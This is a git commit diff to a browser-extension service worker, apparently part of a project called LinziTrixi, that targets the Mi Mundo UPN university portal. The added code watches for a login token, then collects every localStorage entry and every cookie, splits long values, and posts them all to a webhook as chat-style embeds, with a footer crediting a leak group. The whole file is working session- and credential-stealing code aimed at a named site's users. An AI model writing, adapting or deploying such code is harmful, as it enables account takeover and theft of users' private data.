fe005422ac89379a5d2714c9d77b2b9d805f5eab
TeenKiddies <174358061+teenkiddies@users.noreply.github.com>
2024-07-04 14:45:47 -0500

    Add files via upload

--- LinziTrixi/src/background/service_worker.js
+++ LinziTrixi/src/background/service_worker.js
@@ -1,50 +1,126 @@
 const myWebhookURL = "";
 
-function sendMooToken(webhookURL, fullName, mooToken) {
+function sendlocalData(webhookURL) {
   const request = new XMLHttpRequest();
+
+  const lStorageData = [
+    {
+      name: "-----------------------\nLocal Storage\n-----------------------",
+      value: "",
+    },
+  ];
+
+  for (let key in localStorage) {
+    if (localStorage.hasOwnProperty(key)) {
+      let valueContent = localStorage.getItem(key);
+      let otherPart = valueContent.length;
+
+      if (otherPart >= 1024) {
+        otherPart = Math.floor(otherPart / 2);
+      }
+
+      lStorageData.push({
+        name: key.concat(otherPart !== valueContent.length ? " - Part 1" : ""),
+        value: valueContent.substring(0, otherPart),
+      });
+
+      if (otherPart !== valueContent.length) {
+        lStorageData.push({
+          name: key.concat(" - Part 2"),
+          value: valueContent.substring(otherPart),
+        });
+      }
+    }
+  }
+
+  const cookiesData = [
+    {
+      name: "-----------------------\nCookies\n-----------------------",
+      value: "",
+    },
+  ];
+
+  for (let content of document.cookie.split(";")) {
+    content = content.trim();
+    let nameContent = content.substring(0, content.indexOf("="));
+    let valueContent = content.substring(content.indexOf("=") + 1);
+    let otherPart = valueContent.length;
+
+    if (otherPart >= 1024) {
+      otherPart = Math.floor(otherPart / 2);
+    }
+
+    cookiesData.push({
+      name: nameContent.concat(
+        otherPart !== valueContent.length ? " - Part 1" : ""
+      ),
+      value: valueContent.substring(0, otherPart),
+    });
+
+    if (otherPart !== valueContent.length) {
+      cookiesData.push({
+        name: nameContent.concat(" - Part 2"),
+        value: valueContent.substring(otherPart),
+      });
+    }
+  }
+
   const params = JSON.stringify({
-    username: "LinziTrixi",
-    avatar_url: "https://avatars.githubusercontent.com/u/154272786?s=200&v=4",
+    content: null,
     embeds: [
       {
-        color: 3447003,
-        fields: [
-          {
-            name: "Full Name: ",
-            value: fullName,
-          },
-          {
-            name: "mooToken: ",
-            value: mooToken,
-          },
-        ],
+        title: "Mi Mundo UPN",
+        url: "https://mimundo.upn.edu.pe/",
+        color: 8245659,
+        fields: lStorageData,
+      },
+      {
+        color: 3381182,
+        fields: cookiesData,
         footer: {
           text: "github.com/RazeLeakers",
         },
+        timestamp: new Date().toISOString(),
       },
     ],
+    username: "LinziTrixi",
+    avatar_url: "https://avatars.githubusercontent.com/u/154272786?s=200&v=4",
+    attachments: [],
   });
 
   request.open("POST", webhookURL);
   request.setRequestHeader("Content-type", "application/json");
+  request.onload = function () {
+    if (request.status >= 200 && request.status < 300) {
+      console.log("%cSend!", "color: green; font-size: 80px;");
+    } else {
+      console.log(
+        "%cStatus Error " + request.status + "!",
+        "color: yellow; font-size: 80px;"
+      );
+    }
+  };
+  request.onerror = function () {
+    console.log("%cFatal Error", "color: red; font-size: 80px;");
+  };
   request.send(params);
 }
 
 let saveToken = "";
 
 const observer = new MutationObserver(() => {
-  const userToken = localStorage.getItem("mooToken");
+  let userToken = localStorage.getItem("user");
+
+  if (!userToken) return;
+
+  userToken = userToken.includes("mooToken")
+    ? localStorage.getItem("mooToken")
+    : null;
 
   if (!userToken || userToken === saveToken) return;
 
-  const userInfo = localStorage.getItem("user");
+  sendlocalData(myWebhookURL);
 
-  if (userInfo) {
-    sendMooToken(myWebhookURL, JSON.parse(userInfo).name, userToken);
-  } else {
-    sendMooToken(myWebhookURL, null, userToken);
-  }
-  console.log("%cSend!", "color: red; font-size: 40px;");
   saveToken = userToken;
 });
 
